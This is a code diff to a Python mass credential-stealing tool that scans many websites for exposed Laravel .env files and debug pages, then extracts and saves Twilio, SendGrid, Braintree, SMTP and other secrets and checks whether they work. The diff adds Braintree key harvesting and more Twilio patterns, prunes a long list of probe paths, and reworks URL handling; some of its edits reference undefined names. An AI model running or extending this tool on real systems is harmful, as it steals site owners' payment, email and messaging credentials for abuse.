@@ -1,4 +1,3 @@
-# author = Ridho |
 import requests, os, sys, time, ctypes, random, datetime, uuid, re, socket,hashlib,hmac,base64,bs4
 import colorama, paramiko
 import smtplib
@@ -10,6 +9,7 @@ from threading import Timer
 from threading import *
 from threading import Thread
 from colorama import Fore
+from urllib.parse import urlparse, urlunparse
 import configparser
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -75,96 +75,7 @@ except:
         '/sites/all/libraries/mailchimp/.env',
         '/database/.env',
         '/public/.env',
-        '/[DOMAIN]/.env'
-        ''
-        '/phpinfo', '/php_info', '/_profiler/phpinfo', '/phpinfo.php', '/info.php', "/backend/.env", "/project/.env", "/.env", "/adm/.env.bak", "/adm/.env", "/adm/config.env",
-        "/adm/.env.dist", "/adm/.env.dev", "/adm/.env.local", "/admin/.env.bak", "/admin/.env",
-        "/admin/config.env", "/admin/.env.dist", "/admin/.env.dev", "/admin/.env.local", "/admins/.env.bak",
-        "/admins/.env", "/admins/config.env", "/admins/.env.dist", "/admins/.env.dev", "/admins/.env.local",
-        "/administration/.env.bak", "/administration/.env", "/administration/config.env",
-        "/administration/.env.dist", "/administration/.env.dev", "/administration/.env.local", "/api/.env.bak",
-        "/api/.env", "/api/config.env", "/api/.env.dist", "/api/.env.dev", "/api/.env.local", "/app/.env.bak",
-        "/app/.env", "/app/config.env", "/app/.env.dist", "/app/.env.dev", "/app/.env.local", "/apis/.env.bak",
-        "/apis/.env", "/apis/config.env", "/apis/.env.dist", "/apis/.env.dev", "/apis/.env.local", "/back/.env.bak",
-        "/back/.env", "/back/config.env", "/back/.env.dist", "/back/.env.dev", "/back/.env.local", "/backend/.env.bak",
-        "/backend/config.env", "/backend/.env.dist", "/backend/.env.dev", "/backend/.env.local", "/backup/.env.bak",
-        "/backup/.env", "/backup/config.env", "/backup/.env.dist", "/backup/.env.dev", "/backup/.env.local",
-        "/beta/.env.bak", "/beta/.env", "/beta/config.env", "/beta/.env.dist", "/beta/.env.dev", "/beta/.env.local",
-        "/bot/.env.bak", "/bot/.env", "/bot/config.env", "/bot/.env.dist", "/bot/.env.dev", "/bot/.env.local",
-        "/client/.env.bak", "/client/.env", "/client/config.env", "/client/.env.dist", "/client/.env.dev",
-        "/client/.env.local", "/conf/.env.bak", "/conf/.env", "/conf/config.env", "/conf/.env.dist", "/conf/.env.dev",
-        "/conf/.env.local", "/config/.env.bak", "/config/.env", "/config/config.env", "/config/.env.dist",
-        "/config/.env.dev", "/config/.env.local", "/common/.env.bak", "/common/.env", "/common/config.env",
-        "/common/.env.dist", "/common/.env.dev", "/common/.env.local", "/crm/.env.bak", "/crm/.env", "/crm/config.env",
-        "/crm/.env.dist", "/crm/.env.dev", "/crm/.env.local", "/current/.env.bak", "/current/.env",
-        "/current/config.env", "/current/.env.dist", "/current/.env.dev", "/current/.env.local", "/cron/.env.bak",
-        "/cron/.env", "/cron/config.env", "/cron/.env.dist", "/cron/.env.dev", "/cron/.env.local", "/cms/.env.bak",
-        "/cms/.env", "/cms/config.env", "/cms/.env.dist", "/cms/.env.dev", "/cms/.env.local", "/client/.env.bak",
-        "/client/.env", "/client/config.env", "/client/.env.dist", "/client/.env.dev", "/client/.env.local",
-        "/default/.env.bak", "/default/.env", "/default/config.env", "/default/.env.dist", "/default/.env.dev",
-        "/default/.env.local", "/demo/.env.bak", "/demo/.env", "/demo/config.env", "/demo/.env.dist", "/demo/.env.dev",
-        "/demo/.env.local", "/deploy/.env.bak", "/deploy/.env", "/deploy/config.env", "/deploy/.env.dist",
-        "/deploy/.env.dev", "/deploy/.env.local", "/deployment/.env.bak", "/deployment/.env", "/deployment/config.env",
-        "/deployment/.env.dist", "/deployment/.env.dev", "/deployment/.env.local", "/dev/.env.bak", "/dev/.env",
-        "/dev/config.env", "/dev/.env.dist", "/dev/.env.dev", "/dev/.env.local", "/developer/.env.bak",
-        "/developer/.env", "/developer/config.env", "/developer/.env.dist", "/developer/.env.dev",
-        "/developer/.env.local", "/development/.env.bak", "/development/.env", "/development/config.env",
-        "/development/.env.dist", "/development/.env.dev", "/development/.env.local", "/erp/.env.bak", "/erp/.env",
-        "/erp/config.env", "/erp/.env.dist", "/erp/.env.dev", "/erp/.env.local", "/feature/.env.bak", "/feature/.env",
-        "/feature/config.env", "/feature/.env.dist", "/feature/.env.dev", "/feature/.env.local", "/function/.env.bak",
-        "/function/.env", "/function/config.env", "/function/.env.dist", "/function/.env.dev", "/function/.env.local",
-        "/helper/.env.bak", "/helper/.env", "/helper/config.env", "/helper/.env.dist", "/helper/.env.dev",
-        "/helper/.env.local", "/info/.env.bak", "/info/.env", "/info/config.env", "/info/.env.dist", "/info/.env.dev",
-        "/info/.env.local", "/lms/.env.bak", "/lms/.env", "/lms/config.env", "/lms/.env.dist", "/lms/.env.dev",
-        "/lms/.env.local", "/lara/.env.bak", "/lara/.env", "/lara/config.env", "/lara/.env.dist", "/lara/.env.dev",
-        "/lara/.env.local", "/live/.env.bak", "/live/.env", "/live/config.env", "/live/.env.dist", "/live/.env.dev",
-        "/live/.env.local", "/laravel/.env.bak", "/laravel/.env", "/laravel/config.env", "/laravel/.env.dist",
-        "/laravel/.env.dev", "/laravel/.env.local", "/market/.env.bak", "/market/.env", "/market/config.env",
-        "/market/.env.dist", "/market/.env.dev", "/market/.env.local", "/marketing/.env.bak", "/marketing/.env",
-        "/marketing/config.env", "/marketing/.env.dist", "/marketing/.env.dev", "/marketing/.env.local",
-        "/mail/.env.bak", "/mail/.env", "/mail/config.env", "/mail/.env.dist", "/mail/.env.dev", "/mail/.env.local",
-        "/mailer/.env.bak", "/mailer/.env", "/mailer/config.env", "/mailer/.env.dist", "/mailer/.env.dev",
-        "/mailer/.env.local", "/media/.env.bak", "/media/.env", "/media/config.env", "/media/.env.dist",
-        "/media/.env.dev", "/media/.env.local", "/node/.env.bak", "/node/.env", "/node/config.env", "/node/.env.dist",
-        "/node/.env.dev", "/node/.env.local", "/nodeapi/.env.bak", "/nodeapi/.env", "/nodeapi/config.env",
-        "/nodeapi/.env.dist", "/nodeapi/.env.dev", "/nodeapi/.env.local", "/old/.env.bak", "/old/.env", "/old/config.env",
-        "/old/.env.dist", "/old/.env.dev", "/old/.env.local", "/portal/.env.bak", "/portal/.env", "/portal/config.env",
-        "/portal/.env.dist", "/portal/.env.dev", "/portal/.env.local", "/public/.env.bak", "/public/.env",
-        "/public/config.env", "/public/.env.dist", "/public/.env.dev", "/public/.env.local", "/public_html/.env.bak",
-        "/public_html/.env", "/public_html/config.env", "/public_html/.env.dist", "/public_html/.env.dev",
-        "/public_html/.env.local", "/prod/.env.bak", "/prod/.env", "/prod/config.env", "/prod/.env.dist",
-        "/prod/.env.dev", "/prod/.env.local", "/product/.env.bak", "/product/.env", "/product/config.env",
-        "/product/.env.dist", "/product/.env.dev", "/product/.env.local", "/production/.env.bak", "/production/.env",
-        "/production/config.env", "/production/.env.dist", "/production/.env.dev", "/production/.env.local",
-        "/project/.env.bak", "/project/.env", "/project/config.env", "/project/.env.dist", "/project/.env.dev",
-        "/project/.env.local", "/qa/.env.bak", "/qa/.env", "/qa/config.env", "/qa/.env.dist", "/qa/.env.dev",
-        "/qa/.env.local", "/server/.env.bak", "/server/.env", "/server/config.env", "/server/.env.dist",
-        "/server/.env.dev", "/server/.env.local", "/service/.env.bak", "/service/.env", "/service/config.env",
-        "/service/.env.dist", "/service/.env.dev", "/service/.env.local", "/services/.env.bak", "/services/.env",
-        "/services/config.env", "/services/.env.dist", "/services/.env.dev", "/services/.env.local", "/stg/.env.bak",
-        "/stg/.env", "/stg/config.env", "/stg/.env.dist", "/stg/.env.dev", "/stg/.env.local", "/stage/.env.bak",
-        "/stage/.env", "/stage/config.env", "/stage/.env.dist", "/stage/.env.dev", "/stage/.env.local",
-        "/staging/.env.bak", "/staging/.env", "/staging/config.env", "/staging/.env.dist", "/staging/.env.dev",
-        "/staging/.env.local", "/test/.env.bak", "/test/.env", "/test/config.env", "/test/.env.dist", "/test/.env.dev",
-        "/test/.env.local", "/tests/.env.bak", "/tests/.env", "/tests/config.env", "/tests/.env.dist", "/tests/.env.dev",
-        "/tests/.env.local", "/testing/.env.bak", "/testing/.env", "/testing/config.env", "/testing/.env.dist",
-        "/testing/.env.dev", "/testing/.env.local", "/user/.env.bak", "/user/.env", "/user/config.env",
-        "/user/.env.dist", "/user/.env.dev", "/user/.env.local", "/users/.env.bak", "/users/.env", "/users/config.env",
-        "/users/.env.dist", "/users/.env.dev", "/users/.env.local", "/src/.env.bak", "/src/.env", "/src/config.env",
-        "/src/.env.dist", "/src/.env.dev", "/src/.env.local", "/web/.env.bak", "/web/.env", "/web/config.env",
-        "/web/.env.dist", "/web/.env.dev", "/web/.env.local", "/website/.env.bak", "/website/.env",
-        "/website/config.env", "/website/.env.dist", "/website/.env.dev", "/website/.env.local", "/API/.env.bak",
-        "/API/.env", "/API/config.env", "/API/.env.dist", "/API/.env.dev", "/API/.env.local", "/.env", "/.env.local",
-        "/.env.production", "/.env.staging", "/backup/.env", "/public/.env", "/laravel/.env", "/erp/.env",
-        "/config.env", "/config/.env", "/beta/.env", "/live/.env", "/lms/.env", "/demo/.env", "/test/.env", "/kyc/.env",
-        "/admin/.env", "/client/.env", "/user/.env", "/usr/.env", "/api/.env", "/apis/.env", "/back/.env",
-        "/backend/.env", "/front/.env", "/frontend/.env", "/server/.env", "/app/.env", "/apps/.env", "/application/.env",
-        "/cron/.env", "/cms/.env", "/current/.env", "/dev/.env", "/developer/.env", "/develop/.env",
-        "/development/.env", "/prod/.env", "/product/.env", "/production/.env", "/portal/.env", "/stg/.env",
-        "/staging/.env", "/service/.env", "/services/.env", "/storage/.env", "/old/.env", "/new/.env", "/web/.env",
-        "/website/.env", "/market/.env", "/marketing/.env", "/media/.env", "/node/.env", "/nodeapi/.env", "/nodeweb/.env",
-        "/shop/.env", "/public_html/.env", "/xampp/.env", "/API/.env", "/APP/.env", "/BACK/.env", "/BackEnd/.env",
-        "/BACKEND/.env", "/FRONT/.env", "/FRONTEND/.env"
+        '/[DOMAIN]/.env',
     ]
     for pet in path:
         open('path.txt', 'a').write(pet + '\n')
@@ -1724,6 +1635,55 @@ class grabber:
                           objek += 1
                     except:
                      pass
+            
+            if 'TWILIO_ACCOUNTSID=' in teks:
+                try:
+                    sid = re.findall('TWILIO_ACCOUNTSID=(.*?)\n', teks)[0]
+                    if '\r' in sid:
+                        sid = sid.replace('\r', '')
+                    token = re.findall('TWILIO_AUTHTOKEN=(.*?)\n', teks)[0]
+                    if '\r' in token:
+                        token = token.replace('\r', '')
+                    if sid == '' or sid == 'null' or sid == '""':
+                        pass
+                    else:
+                        pack = clean(urlku + '|' + sid + '|' + token)
+                        with open('Result/twilio.txt', 'a') as epep:
+                            epep.write(pack + '\n')
+                        ceker_twilio(urlku, sid, token)
+                        objek += 1
+                except:
+                    try:
+                     if '=AC' in teks:
+                      with open('Result/tw.txt', 'a') as epep:
+                          epep.write(urlku + '\n')
+                          objek += 1
+                    except:
+                     pass
+            if 'ACCOUNT_SID=' in teks:
+                try:
+                    sid = re.findall('ACCOUNT_SID=(.*?)\n', teks)[0]
+                    if '\r' in sid:
+                        sid = sid.replace('\r', '')
+                    token = re.findall('AUTH_TOKEN=(.*?)\n', teks)[0]
+                    if '\r' in token:
+                        token = token.replace('\r', '')
+                    if sid == '' or sid == 'null' or sid == '""':
+                        pass
+                    else:
+                        pack = clean(urlku + '|' + sid + '|' + token)
+                        with open('Result/twilio.txt', 'a') as epep:
+                            epep.write(pack + '\n')
+                        ceker_twilio(urlku, sid, token)
+                        objek += 1
+                except:
+                    try:
+                     if '=AC' in teks:
+                      with open('Result/tw.txt', 'a') as epep:
+                          epep.write(urlku + '\n')
+                          objek += 1
+                    except:
+                     pass
             if 'TWILIO_ACCOUNT_SID=' in teks:
                 try:
                     sid = re.findall('TWILIO_ACCOUNT_SID=(.*?)\n', teks)[0]
@@ -1806,6 +1766,54 @@ class grabber:
             else:
                 return objek
 
+    def get_braintre(self, method, urlku, teks):
+        
+        if method == 'env':
+            if 'BRAINTREE_PUBLIC_KEY=' in teks:
+                objek = 0
+                try:
+                    key = re.findall('BRAINTREE_PUBLIC_KEY=(.*?)\n', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    sec = re.findall('BRAINTREE_PRIVATE_KEY=(.*?)\n', teks)[0]
+                    if '\r' in sec:
+                        sec = sec.replace('\r', '')
+                    if key == '""' or key == 'null' or key == '':
+                        return False
+                    else:
+                        satu = clean(str(key) + "|" + str(sec))
+                        with open('Result/braintre.txt', 'a') as ff:
+                            ff.write(satu + '\n')
+                        objek += 1
+                        return True
+                except:
+                    return False
+            else:
+                return False
+        elif method == 'debug':
+            if 'BRAINTREE_PUBLIC_KEY' in teks:
+                objek = 0
+                try:
+                    key = re.findall('<td>BRAINTREE_PUBLIC_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
+                    if '\r' in key:
+                        key = key.replace('\r', '')
+                    sec = re.findall('<td>BRAINTREE_PRIVATE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
+                    if '\r' in sec:
+                        sec = sec.replace('\r', '')
+                    if key == '""' or key == 'null' or key == '' or key == '******':
+                        return False
+                    else:
+                        satu = clean(str(key) + "|" + str(sec))
+                        with open('Result/braintre.txt', 'a') as ff:
+                            ff.write(satu + '\n')
+                        objek += 1
+                        return True
+                except:
+                    return False
+            else:
+                return False
+        else:
+            return False
     def get_nexmo(self, method, urlku, teks):
         if method == 'env':
             if 'NEXMO_KEY=' in teks:
@@ -1914,6 +1922,7 @@ class grabber:
                     if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
                         pass
                     else:
+                        ceker_sendgrid(str(key))
                         asu = str(key)
                         with open('Result/sendgridkey.txt', 'a') as ppp:
                             ppp.write(asu + '\n')
@@ -1944,6 +1953,7 @@ class grabber:
                     if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
                         pass
                     else:
+                        ceker_sendgrid(str(key))
                         asu = str(key)
                         with open('Result/sendgridkey.txt', 'a') as ppp:
                             ppp.write(asu + '\n')
@@ -1974,6 +1984,7 @@ class grabber:
                     if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
                         pass
                     else:
+                        ceker_sendgrid(str(key))
                         asu = str(key)
                         with open('Result/sendgridkey.txt', 'a') as ppp:
                             ppp.write(asu + '\n')
@@ -2004,6 +2015,7 @@ class grabber:
                     if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
                         pass
                     else:
+                        ceker_sendgrid(str(key))
                         asu = str(key)
                         with open('Result/sendgridkey.txt', 'a') as ppp:
                             ppp.write(asu + '\n')
@@ -2025,6 +2037,7 @@ class grabber:
                     if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
                         pass
                     else:
+                        ceker_sendgrid(str(key))
                         asu = str(key)
                         with open('Result/sendgridkey.txt', 'a') as ppp:
                             ppp.write(asu + '\n')
@@ -2062,6 +2075,7 @@ class grabber:
                     if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
                         pass
                     else:
+                        ceker_sendgrid(str(key))
                         asu = str(key)
                         with open('Result/sendgridkey.txt', 'a') as ppp:
                             ppp.write(asu + '\n')
@@ -2077,6 +2091,7 @@ class grabber:
                     if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
                         pass
                     else:
+                        ceker_sendgrid(str(key))
                         asu = str(key)
                         with open('Result/sendgridkey.txt', 'a') as ppp:
                             ppp.write(asu + '\n')
@@ -2092,6 +2107,7 @@ class grabber:
                     if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
                         pass
                     else:
+                        ceker_sendgrid(str(key))
                         asu = str(key)
                         with open('Result/sendgridkey.txt', 'a') as ppp:
                             ppp.write(asu + '\n')
@@ -2107,6 +2123,7 @@ class grabber:
                     if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
                         pass
                     else:
+                        ceker_sendgrid(str(key))
                         asu = str(key)
                         with open('Result/sendgridkey.txt', 'a') as ppp:
                             ppp.write(asu + '\n')
@@ -2648,7 +2665,7 @@ def gas(tar):
             tss,
             headers=head,
             data={
-                '0x[]': 'ridho'
+                '0x[]': '$'
             },
             timeout=15,
             allow_redirects=False,
@@ -3026,17 +3043,18 @@ def smtp_login(target, tutor, hostnya, portnya, usernya, pwnya,mail_fromer=False
                 <p>PORT : """ + portnya + """</p>
                 <p>USER : """ + usernya + """</p>
                 <p>PASS : """ + pwnya + """</p>
-                <p>FROM : """ + mailfrom + """</p> 
+                <p>FROM : """ + mail_name + """</p> 
                 """, 'html', 'utf-8'))
     else:
         if comment:
             msg.attach(MIMEText(comment, 'html', 'utf-8'))
         else:
-            msg.attach(MIMEText(""" <p>HOST : """ + hostnya + """</p>
+            msg.attach(MIMEText(
+            """ <p>HOST : """ + hostnya + """</p>
                 <p>PORT : """ + portnya + """</p>
                 <p>USER : """ + usernya + """</p>
                 <p>PASS : """ + pwnya + """</p>
-                <p>FROM : """ + mailfrom + """</p>""", 'html', 'utf-8'))
+                <p>FROM : """ + mail_from + """</p>""", 'html', 'utf-8'))
     try:
         server = smtplib.SMTP(hostnya, int(portnya),timeout=10)
         server.login(usernya, pwnya)
@@ -3185,6 +3203,7 @@ class laravel_grabber:
         self.bad = 0
         self.smtp = 0
         self.sendgrid = 0
+        self.braintre = 0
         self.sendgridcek = 0
         self.mailguncek = 0
         self.database = 0
@@ -3196,10 +3215,10 @@ class laravel_grabber:
         self.home()
 
     def attack(self, ts):
-        self.loop += 1
-        if os.name == 'nt' and sys.version_info.major == 3:
-            ctypes.windll.kernel32.SetConsoleTitleW("{}|ENV=>({})|DEBUG=>({})|SMTP=>({})|DB=>({})|AWS=>({})|NEXMO=>({})|TWILIO=>({})|SHELL=>({})|SENDGRID=>({})".format(self.loop, self.env, self.debug, self.smtp, self.database, self.aws, self.nexmo, self.twilio,self.unit,self.sendgrid))
-        try:
+        #self.loop += 1
+        #if os.name == 'nt' and sys.version_info.major == 3:
+        #try:
+            self.loop += 1
             tos = gas(ts)
             # print(tos)
             if tos['status'] == 'ok':
@@ -3214,6 +3233,10 @@ class laravel_grabber:
                 if smtp:
                     self.smtp += smtp
                     text += '[\033[92mSMTP\033[0m]'
+                braintree = grabber().get_braintre(tos['method'], tos['url'], tos['respon'])
+                if braintree:
+                    self.braintree += braintree
+                    text += '[\033[92mBRAINTREE\033[0m]'
                 sendgridcek = grabber().get_sendgrid(tos['method'], tos['url'], tos['respon'])
                 if sendgridcek:
                     self.sendgridcek += sendgridcek
@@ -3399,71 +3422,44 @@ class laravel_grabber:
                         print(merah + '#' + reset + ' {} - '.format(tos['url']) + merah + "Cant Get Everything")
                 else:
                     print(merah + '#' + reset + ' {} - '.format(tos['url']) + merah + "Cant Get Everything")
-        except:
-            print(kuning + '#' + reset + ' {} - '.format(ts) + kuning + "Cant Access Site")
-            #print(er)
+        #except Exception as er:
+            #print(kuning + '#' + reset + ' {} - '.format(ts) + kuning + "Cant Access Site")
+            #print(kuning + '#' + reset + ' {} - '.format(ts) + kuning + "Cant Access Site" + reset + er)
+
+    def remove_path_from_url(url):
+     """
+     Remove the path from a URL and return only the domain.
+    
+    :param url: str, the original URL
+    :return: str, the URL without the path
+    """
+     parsed_url = urlparse(url)
+     url_without_path = urlunparse((parsed_url.scheme, parsed_url.netloc, '', '', '', ''))
+     return url_without_path
 
     def cekHttp(self, ez):
-        resume = False
+        #resume = False
+        #url_without_path = []
         try:
-            if '://' not in ez:
-                ez = re.findall('http://(.*?)/', ez)[0]
-                # print(ez)
-                self.attack('http://' + ez)
-                resume = False
-            elif 'https://' in ez:
-                ez = re.findall('https://(.*?)/', ez)[0]
-                self.attack('https://' + ez)
-                resume = False
+            
+            if ez.endswith('/'):
+                ez = ez[:-1]
+                self.attack(ez)
+            
+            if '://' in ez:
+                self.attack(ez)
             else:
-                resume = True
-        except:
-            resume = True
-        if resume:
-            #print(ez.replace('\n',''))
-            ez = parser_url(ez.replace('\n',''))
-            #print(ez)
-            if ez:
-                try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.settimeout(6)
-                    ress = sock.connect_ex((ez, 80))
-                    sock.close()
-                    if str(ress) == '0':
-                        self.attack('https://' + ez)
-                    else:
-                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        sock.settimeout(6)
-                        ress = sock.connect_ex((ez, 443))
-                        sock.close()
-                        if str(ress) == '0':
-                            self.attack('https://' + ez)
-                        else:
-                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                            sock.settimeout(6)
-                            ress = sock.connect_ex((ez, 8080))
-                            sock.close()
-                            if str(ress) == '0':
-                                self.attack('https://' + ez + ':8080')
-                            else:
-                                if ':' in ez:
-                                    key = ez.split(':')
-                                    if key[1].isdigit():
-                                        try:
-                                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                                            sock.settimeout(18)
-                                            ress = sock.connect_ex((ez, int(key[1])))
-                                            sock.close()
-                                            if str(ress) == '0':
-                                                self.attack('https://' + ez + ':' + key[1])
-                                        except:
-                                            pass
-                                    else:
-                                        pass
-                                else:
-                                    pass
-                except:
-                    print(kuning + '#' + reset + ' {0} - '.format('http://'+str(ez)) + kuning + "Cant Access Site")
+                processed_urls = []
+                ez = "https://"+ez
+                r = requests.get(ez, timeout=10).url
+                processed_url = remove_path_from_url(r)
+                processed_urls.append(processed_url)
+            for url in processed_urls:
+                    self.attack(url)
+            
+        except Exception as er:
+            #print(kuning + '#' + reset + ' {} - '.format(ez) + kuning + "Cant Access Site" + reset + er)
+            print(kuning + '#' + reset + ' {} - '.format(str(ez)) + kuning + "Cant Access Site")
                     #print(er)
 
     def home(self):
